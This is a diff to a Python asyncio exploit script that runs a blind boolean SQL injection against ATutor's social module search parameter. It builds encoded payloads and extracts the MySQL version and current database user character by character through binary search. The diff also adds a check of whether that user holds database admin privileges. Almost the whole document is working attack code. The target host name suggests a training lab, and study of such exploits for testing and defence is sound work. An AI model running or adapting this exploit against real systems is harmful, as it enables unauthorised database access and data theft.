@@ -1,4 +1,5 @@
 import asyncio
+from re import A
 from types import coroutine
 from urllib import response
 import aiohttp
@@ -11,10 +12,6 @@ try:
 except:
     pass
 
-
-
-#import requests
-import sys
 SQL_URL = "http://atutor/ATutor/mods/_standard/social/index_public.php?q="
 LOGIN_URL = "http://atutor/ATutor/login.php"
 COMMENT="%23"
@@ -22,7 +19,6 @@ COMMENT="%23"
 blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
 blind_sqli_falsy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=2,({sub_query}),1)){comment}"
 ENCODE = lambda s: s.replace(' ','/**/')
-
 QUERIES = {
     'DB_VERSION': "select version()",
     'STR_EXFIL': lambda sub_query,position, mid: F"ascii(substring(({sub_query}),{position},1))>{mid}", 
@@ -30,7 +26,6 @@ QUERIES = {
     'COUNT_EXFIL': lambda sub_query,i: F"SELECT ({sub_query})={i}",
     'CURRENT_USER_IS_DB_ADMIN' : lambda username:  F"SELECT(SELECT COUNT(*) FROM mysql.user WHERE Super_priv ='Y' AND current_user='{username}')>1",
 }
-
 
 async def run_until_found(tasklist: List):
     """Run all generated tasks until value is returned, cancel the rest"""
@@ -42,7 +37,6 @@ async def run_until_found(tasklist: List):
             break
     map(lambda x: x.cancel(), tasks)
     return response
-
 # here we specify the condition that lets us infer the result of a query from the response 
 def response_truth_condition(response): 
     content_length = int(response.headers['Content-Length'])
@@ -53,10 +47,10 @@ def response_truth_condition(response):
     return False
 
 async def blind_query(session:aiohttp.client.ClientSession,  truth_condition,
-                      ip:str, sub_query:str, sub_query_cmp_value:str = "",
+                      ip:str, sub_query:str, ordinal:str = "",
                       encode:bool=False, debug:bool=False
                       ):
-    target = ENCODE(blind_sqli_truthy(ip,sub_query, COMMENT)) if encode else blind_sqli_truthy(ip,sub_query, COMMENT)
+    target = ENCODE(blind_sqli_truthy(ip,sub_query, COMMENT)) if encode else blind_sqli_truthy(ip, sub_query, COMMENT)
     try:
         async with session.get(target) as res:
             if debug == True:
@@ -64,16 +58,15 @@ async def blind_query(session:aiohttp.client.ClientSession,  truth_condition,
                 print("response headers: ", res.headers)
                 print("response: ", res.content)
             if (truth_condition(res)):
-                return sub_query_cmp_value if sub_query_cmp_value else True
+                return ordinal if ordinal else True
             return False
     except aiohttp.client_exceptions.ServerDisconnectedError:
         return False
- 
 async def blind_query_binary_search(session:aiohttp.client.ClientSession,  truth_condition,
                       ip:str, sub_query:str, sub_query_cmp_value:str = "",
                       encode:bool=False, debug:bool=False
                       ):
-    target = ENCODE(blind_sqli_truthy(ip,sub_query, COMMENT)) if encode else blind_sqli_truthy(ip,sub_query, COMMENT)
+    target = ENCODE(blind_sqli_truthy(ip,sub_query, COMMENT)) if encode else blind_sqli_truthy(ip, sub_query, COMMENT)
     try:
         async with session.get(target) as res:
             if debug == True:
@@ -85,7 +78,9 @@ async def blind_query_binary_search(session:aiohttp.client.ClientSession,  truth
             return False
     except aiohttp.client_exceptions.ServerDisconnectedError:
         return False   
-
+async def question(sub_query: str):
+    async with aiohttp.ClientSession() as session:
+        return await blind_query(session, response_truth_condition, SQL_URL, sub_query, encode=True)
 async def get_length(sub_query: str, lower_bound: int = 1, upper_bound: int = 65):
     async with aiohttp.ClientSession() as session:
         cr_length = [
@@ -134,10 +129,15 @@ async def get_string(sub_query:str, strlen: int):
             print(F"(+) Could not exfil string with subquery [{sub_query}].")
             exit(1)
 async def report():
-    version_len = await get_length("select version()")
-    print(version_len)
-    version = await get_string("select version()", 19)
-    print(version)
+    version_strlen = await get_length("select version()")
+    print("(+) DB Version strlen: ", version_strlen)
+    print(F"(+) MySQL Version: {await get_string('select version()', version_strlen)}")
+    db_user_strlen = await get_length("select current_user()")
+    print("(+) Current DB User strlen: ", db_user_strlen)
+    db_user = await  get_string("select current_user()", db_user_strlen)
+    print(F"(+) Current DB User: {db_user}")
+    print(F"(+) Current User is DB Admin?: {await question(QUERIES['CURRENT_USER_IS_DB_ADMIN'](db_user))}")
+    '''
     num_tables = await get_count("SELECT COUNT(table_name) FROM information_schema.tables")
     print(num_tables)
     table_name_lengths = []
@@ -147,12 +147,9 @@ async def report():
         print(i, ":", table_name_lengths[i])
         tables.append(await get_string(F"SELECT table_name FROM information_schema.tables LIMIT {i},1", table_name_lengths[i]))
         print(tables[i], ":", table_name_lengths[i])
-
+    '''
+try:
+    asyncio.run(report())
+# https://github.com/MagicStack/uvloop/issues/349
+except NotImplementedError:
     pass
-
-if __name__ == "__main__":
-    try:
-        asyncio.run(report())
-    # https://github.com/MagicStack/uvloop/issues/349
-    except NotImplementedError:
-        pass
